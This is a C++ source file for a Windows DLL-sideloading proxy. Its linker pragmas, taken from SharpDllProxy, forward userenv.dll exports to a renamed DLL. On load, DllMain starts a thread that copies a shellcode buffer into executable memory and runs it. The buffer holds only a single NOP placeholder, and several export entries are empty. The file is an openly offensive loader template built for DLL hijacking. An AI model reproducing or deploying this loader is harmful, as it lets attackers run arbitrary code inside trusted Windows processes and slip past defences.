
#define _CRT_SECURE_NO_WARNINGS
#define MAX_ARGS 100
#define MAX_ARG_LENGTH 255

#include <windows.h>
#include <processenv.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)


#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

//header taken from SharpDllProxy https://github.com/Flangvik/SharpDllProxy
#pragma comment(linker, "/export:=tmp297.,@104")
#pragma comment(linker, "/export:RsopLoggingEnabled=tmp297.RsopLoggingEnabled,@105")
#pragma comment(linker, "/export:AreThereVisibleLogoffScripts=tmp297.AreThereVisibleLogoffScripts,@106")
#pragma comment(linker, "/export:AreThereVisibleShutdownScripts=tmp297.AreThereVisibleShutdownScripts,@107")
#pragma comment(linker, "/export:CreateAppContainerProfile=tmp297.CreateAppContainerProfile,@108")
#pragma comment(linker, "/export:CreateEnvironmentBlock=tmp297.CreateEnvironmentBlock,@109")
#pragma comment(linker, "/export:CreateProfile=tmp297.CreateProfile,@110")
#pragma comment(linker, "/export:DeleteAppContainerProfile=tmp297.DeleteAppContainerProfile,@111")
#pragma comment(linker, "/export:DeleteProfileA=tmp297.DeleteProfileA,@112")
#pragma comment(linker, "/export:DeleteProfileW=tmp297.DeleteProfileW,@113")
#pragma comment(linker, "/export:DeriveAppContainerSidFromAppContainerName=tmp297.DeriveAppContainerSidFromAppContainerName,@114")
#pragma comment(linker, "/export:DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName=tmp297.DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName,@115")
#pragma comment(linker, "/export:DestroyEnvironmentBlock=tmp297.DestroyEnvironmentBlock,@116")
#pragma comment(linker, "/export:DllCanUnloadNow=tmp297.DllCanUnloadNow,@117")
#pragma comment(linker, "/export:DllGetClassObject=tmp297.DllGetClassObject,@118")
#pragma comment(linker, "/export:DllRegisterServer=tmp297.DllRegisterServer,@119")
#pragma comment(linker, "/export:DllUnregisterServer=tmp297.DllUnregisterServer,@120")
#pragma comment(linker, "/export:EnterCriticalPolicySection=tmp297.EnterCriticalPolicySection,@121")
#pragma comment(linker, "/export:=tmp297.,@122")
#pragma comment(linker, "/export:ExpandEnvironmentStringsForUserA=tmp297.ExpandEnvironmentStringsForUserA,@123")
#pragma comment(linker, "/export:ExpandEnvironmentStringsForUserW=tmp297.ExpandEnvironmentStringsForUserW,@124")
#pragma comment(linker, "/export:ForceSyncFgPolicy=tmp297.ForceSyncFgPolicy,@125")
#pragma comment(linker, "/export:FreeGPOListA=tmp297.FreeGPOListA,@126")
#pragma comment(linker, "/export:FreeGPOListW=tmp297.FreeGPOListW,@127")
#pragma comment(linker, "/export:GenerateGPNotification=tmp297.GenerateGPNotification,@128")
#pragma comment(linker, "/export:GetAllUsersProfileDirectoryA=tmp297.GetAllUsersProfileDirectoryA,@129")
#pragma comment(linker, "/export:GetAllUsersProfileDirectoryW=tmp297.GetAllUsersProfileDirectoryW,@130")
#pragma comment(linker, "/export:GetAppContainerFolderPath=tmp297.GetAppContainerFolderPath,@131")
#pragma comment(linker, "/export:GetAppContainerRegistryLocation=tmp297.GetAppContainerRegistryLocation,@132")
#pragma comment(linker, "/export:GetAppliedGPOListA=tmp297.GetAppliedGPOListA,@133")
#pragma comment(linker, "/export:GetAppliedGPOListW=tmp297.GetAppliedGPOListW,@134")
#pragma comment(linker, "/export:=tmp297.,@135")
#pragma comment(linker, "/export:GetDefaultUserProfileDirectoryA=tmp297.GetDefaultUserProfileDirectoryA,@136")
#pragma comment(linker, "/export:=tmp297.,@137")
#pragma comment(linker, "/export:GetDefaultUserProfileDirectoryW=tmp297.GetDefaultUserProfileDirectoryW,@138")
#pragma comment(linker, "/export:=tmp297.,@139")
#pragma comment(linker, "/export:GetGPOListA=tmp297.GetGPOListA,@140")
#pragma comment(linker, "/export:GetGPOListW=tmp297.GetGPOListW,@141")
#pragma comment(linker, "/export:GetNextFgPolicyRefreshInfo=tmp297.GetNextFgPolicyRefreshInfo,@142")
#pragma comment(linker, "/export:GetPreviousFgPolicyRefreshInfo=tmp297.GetPreviousFgPolicyRefreshInfo,@143")
#pragma comment(linker, "/export:GetProfileType=tmp297.GetProfileType,@144")
#pragma comment(linker, "/export:GetProfilesDirectoryA=tmp297.GetProfilesDirectoryA,@145")
#pragma comment(linker, "/export:GetProfilesDirectoryW=tmp297.GetProfilesDirectoryW,@146")
#pragma comment(linker, "/export:GetUserProfileDirectoryA=tmp297.GetUserProfileDirectoryA,@147")
#pragma comment(linker, "/export:GetUserProfileDirectoryW=tmp297.GetUserProfileDirectoryW,@148")
#pragma comment(linker, "/export:HasPolicyForegroundProcessingCompleted=tmp297.HasPolicyForegroundProcessingCompleted,@149")
#pragma comment(linker, "/export:LeaveCriticalPolicySection=tmp297.LeaveCriticalPolicySection,@150")
#pragma comment(linker, "/export:LoadProfileExtender=tmp297.LoadProfileExtender,@151")
#pragma comment(linker, "/export:LoadUserProfileA=tmp297.LoadUserProfileA,@152")
#pragma comment(linker, "/export:LoadUserProfileW=tmp297.LoadUserProfileW,@153")
#pragma comment(linker, "/export:ProcessGroupPolicyCompleted=tmp297.ProcessGroupPolicyCompleted,@154")
#pragma comment(linker, "/export:ProcessGroupPolicyCompletedEx=tmp297.ProcessGroupPolicyCompletedEx,@155")
#pragma comment(linker, "/export:RefreshPolicy=tmp297.RefreshPolicy,@156")
#pragma comment(linker, "/export:RefreshPolicyEx=tmp297.RefreshPolicyEx,@157")
#pragma comment(linker, "/export:RegisterGPNotification=tmp297.RegisterGPNotification,@158")
#pragma comment(linker, "/export:RsopAccessCheckByType=tmp297.RsopAccessCheckByType,@159")
#pragma comment(linker, "/export:RsopFileAccessCheck=tmp297.RsopFileAccessCheck,@160")
#pragma comment(linker, "/export:RsopResetPolicySettingStatus=tmp297.RsopResetPolicySettingStatus,@161")
#pragma comment(linker, "/export:RsopSetPolicySettingStatus=tmp297.RsopSetPolicySettingStatus,@162")
#pragma comment(linker, "/export:UnloadProfileExtender=tmp297.UnloadProfileExtender,@163")
#pragma comment(linker, "/export:UnloadUserProfile=tmp297.UnloadUserProfile,@164")
#pragma comment(linker, "/export:UnregisterGPNotification=tmp297.UnregisterGPNotification,@165")
#pragma comment(linker, "/export:WaitForMachinePolicyForegroundProcessing=tmp297.WaitForMachinePolicyForegroundProcessing,@166")
#pragma comment(linker, "/export:WaitForUserPolicyForegroundProcessing=tmp297.WaitForUserPolicyForegroundProcessing,@167")
#pragma comment(linker, "/export:=tmp297.,@168")
#pragma comment(linker, "/export:=tmp297.,@169")
#pragma comment(linker, "/export:=tmp297.,@170")
#pragma comment(linker, "/export:=tmp297.,@171")
#pragma comment(linker, "/export:=tmp297.,@172")
#pragma comment(linker, "/export:=tmp297.,@173")
#pragma comment(linker, "/export:=tmp297.,@174")
#pragma comment(linker, "/export:=tmp297.,@175")
#pragma comment(linker, "/export:=tmp297.,@176")
#pragma comment(linker, "/export:=tmp297.,@177")
#pragma comment(linker, "/export:=tmp297.,@178")
#pragma comment(linker, "/export:=tmp297.,@179")
#pragma comment(linker, "/export:=tmp297.,@180")
#pragma comment(linker, "/export:=tmp297.,@181")
#pragma comment(linker, "/export:=tmp297.,@182")
#pragma comment(linker, "/export:=tmp297.,@183")
#pragma comment(linker, "/export:=tmp297.,@184")
#pragma comment(linker, "/export:=tmp297.,@185")
#pragma comment(linker, "/export:=tmp297.,@186")
#pragma comment(linker, "/export:=tmp297.,@187")
#pragma comment(linker, "/export:=tmp297.,@188")
#pragma comment(linker, "/export:=tmp297.,@189")
#pragma comment(linker, "/export:=tmp297.,@190")
#pragma comment(linker, "/export:=tmp297.,@191")
#pragma comment(linker, "/export:=tmp297.,@192")
#pragma comment(linker, "/export:=tmp297.,@193")
#pragma comment(linker, "/export:=tmp297.,@194")
#pragma comment(linker, "/export:=tmp297.,@195")
#pragma comment(linker, "/export:=tmp297.,@196")
#pragma comment(linker, "/export:=tmp297.,@197")
#pragma comment(linker, "/export:=tmp297.,@198")
#pragma comment(linker, "/export:=tmp297.,@199")
#pragma comment(linker, "/export:=tmp297.,@200")
#pragma comment(linker, "/export:=tmp297.,@201")
#pragma comment(linker, "/export:=tmp297.,@202")
#pragma comment(linker, "/export:=tmp297.,@203")
#pragma comment(linker, "/export:=tmp297.,@204")
#pragma comment(linker, "/export:=tmp297.,@205")
#pragma comment(linker, "/export:=tmp297.,@206")
#pragma comment(linker, "/export:=tmp297.,@207")
#pragma comment(linker, "/export:=tmp297.,@208")
#pragma comment(linker, "/export:=tmp297.,@209")
#pragma comment(linker, "/export:=tmp297.,@210")
#pragma comment(linker, "/export:=tmp297.,@211")
#pragma comment(linker, "/export:=tmp297.,@212")
#pragma comment(linker, "/export:=tmp297.,@213")
#pragma comment(linker, "/export:=tmp297.,@214")
#pragma comment(linker, "/export:=tmp297.,@215")
#pragma comment(linker, "/export:=tmp297.,@216")
#pragma comment(linker, "/export:=tmp297.,@217")
#pragma comment(linker, "/export:=tmp297.,@218")
#pragma comment(linker, "/export:=tmp297.,@219")


DWORD WINAPI sideload(LPVOID lpParameter)
{

    BOOL rv;
    DWORD oldvirtualprotect = 0;
    const unsigned char raw_sc[] = { 0x90 };
    int length = sizeof(raw_sc);
    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * length * 2); 
    unsigned char* decoded = encoded;
    memcpy(encoded, raw_sc, length);

    VOID* mem = VirtualAlloc(NULL, length, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE); //change permission

    if (mem == NULL)
        return -1;

    bool success = false;

    success = memcpy(mem, decoded, length);

    if (!success) {
        printf("[-] Fail\n");
        return -2;
    }
    rv = VirtualProtect(mem, length, PAGE_EXECUTE_READ, &oldvirtualprotect);
    int ret_val = 0;
    printf("Executing shellcode\n");
    ((void(*)())mem)();
    WaitForSingleObject((HANDLE)-2, INFINITE);
    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        threadHandle = CreateThread(NULL, 0, sideload, NULL, 0, NULL);
        CloseHandle(threadHandle);

    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
